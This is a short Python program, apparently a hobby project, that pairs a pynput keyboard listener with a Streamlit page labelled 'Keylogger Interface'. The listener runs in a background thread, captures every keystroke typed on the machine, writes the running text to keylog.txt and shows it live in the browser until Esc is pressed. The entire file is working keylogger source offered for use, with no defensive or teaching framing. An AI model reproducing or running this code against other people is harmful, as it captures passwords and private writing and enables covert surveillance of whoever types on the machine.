import streamlit as st
from pynput.keyboard import Key, Listener
import threading
import time

# String to store the entire typed text
typed_text = ""

# Function to handle key press
def functionPerKey(key):
    global typed_text
    try:
        if key.char:
            typed_text += key.char
    except AttributeError:
        if key == Key.space:
            typed_text += ' '
        elif key == Key.enter:
            typed_text += '\n'
        elif key == Key.backspace:
            typed_text = typed_text[:-1]

    storeTextToFile(typed_text)

# Function to store text to a file
def storeTextToFile(text):
    with open('keylog.txt', 'w') as log:
        log.write(text)

# Function to handle key release
def onEachKeyRelease(the_key):
    if the_key == Key.esc:
        return False

# Start the listener
def start_listener():
    with Listener(on_press=functionPerKey, on_release=onEachKeyRelease) as the_listener:
        the_listener.join()

# Run the listener in a separate thread
listener_thread = threading.Thread(target=start_listener)
listener_thread.start()

# Streamlit interface
st.title("Keylogger Interface")

# Function to read the file content
def read_file():
    try:
        with open('keylog.txt', 'r') as log:
            return log.read()
    except FileNotFoundError:
        return ""

# Function to clear the file content
def clear_file():
    global typed_text
    typed_text = ""
    with open('keylog.txt', 'w') as log:
        log.write(typed_text)

# Display captured text
st.subheader("Captured Text:")

# Button to refresh the text from the beginning
if st.button('Refresh'):
    clear_file()

# Placeholder for the text area
text_area = st.empty()

# Function to update the text area
def update_text_area():
    while True:
        captured_text = read_file()
        text_area.text_area(label="Captured Text", value=captured_text, height=200, key="text_area_key")
        time.sleep(1)

# Start the text area update function in a separate thread
update_thread = threading.Thread(target=update_text_area)
update_thread.daemon = True
update_thread.start()

# Keep the Streamlit app running
while True:
    time.sleep(1)